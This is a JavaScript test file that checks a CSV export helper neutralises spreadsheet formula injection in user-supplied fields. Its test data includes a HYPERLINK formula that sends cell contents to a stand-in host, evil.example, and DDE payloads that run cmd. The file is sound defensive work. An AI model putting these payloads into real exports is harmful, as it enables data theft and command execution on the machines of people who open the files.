// CSV formula injection — found during #250 and left unrecorded until now.
//
// Correct RFC 4180 quoting is not a defence. A spreadsheet decides a cell is a
// formula from its FIRST CHARACTER, and does so whether or not the field was
// quoted in the file. Every field these exports carry is user-supplied, and the
// feedback export is fed by /api/support, which takes unauthenticated input and
// is read by an admin — attacker chooses the payload, privileged user opens it.
import test from 'node:test'
import assert from 'node:assert/strict'
import fs from 'node:fs'
import path from 'node:path'
import { csvCell, toCsv } from '../../src/utils/csv.js'

test('a leading =, +, - or @ is neutralised so the cell stays text', () => {
  for (const payload of [
    '=HYPERLINK("https://evil.example/?d="&A1,"Click me")',
    '=cmd|\'/c calc\'!A1',
    '+1234567890',
    '-2+3+cmd|\' /c calc\'!A0',
    '@SUM(1+9)*cmd|\' /c calc\'!A0',
  ]) {
    const cell = csvCell(payload)
    assert.ok(cell.startsWith('"\''), `${payload} must be prefixed: got ${cell}`)
  }
})

test('tab and carriage return leads are neutralised too', () => {
  // Both are treated as formula-starting whitespace by at least one major
  // spreadsheet, so escaping only the four obvious characters leaves a hole.
  assert.ok(csvCell('\t=1+1').startsWith('"\''))
  assert.ok(csvCell('\r=1+1').startsWith('"\''))
})

test('ordinary text and plain numbers are left exactly as they were', () => {
  // The apostrophe is not free: applied to a legitimate negative number it
  // corrupts real data to defend against nothing, because a bare number cannot
  // begin a formula.
  assert.equal(csvCell('A dog running on a beach'), '"A dog running on a beach"')
  assert.equal(csvCell('-5'), '"-5"')
  assert.equal(csvCell('-5.25'), '"-5.25"')
  assert.equal(csvCell(''), '""')
  assert.equal(csvCell(null), '""')
  assert.equal(csvCell(undefined), '""')
})

test('quotes are still doubled, so the escaping itself is not the way in', () => {
  assert.equal(csvCell('He said "hi"'), '"He said ""hi"""')
  // A payload that both breaks out and executes must fail on both counts.
  const nasty = csvCell('="a","=cmd|\'/c calc\'!A1"')
  assert.ok(nasty.startsWith('"\'='))
  assert.ok(!/[^"]"[^"]/.test(nasty.slice(1, -1)), 'no unescaped quote survives inside the field')
})

test('toCsv writes our own headers verbatim and routes every body cell', () => {
  const csv = toCsv(['filename', 'alt_text'], [
    { filename: 'cat.png', alt_text: '=1+1' },
  ])
  assert.equal(csv, 'filename,alt_text\n"cat.png","\'=1+1"')
})

// The regression this actually guards: a fourth export written later that
// hand-rolls its own escaping is exactly how the first three got it wrong.
test('no export builds a CSV row without going through the shared helper', () => {
  const files = ['src/pages/AltTextGenerator.jsx', 'src/pages/Admin.jsx']
  for (const file of files) {
    const src = fs.readFileSync(path.join(process.cwd(), file), 'utf8')
    assert.ok(
      !/replace\(\/"\/g, *'""'\)/.test(src),
      `${file} still hand-rolls CSV quote escaping — use csvCell from utils/csv.js`,
    )
  }
})
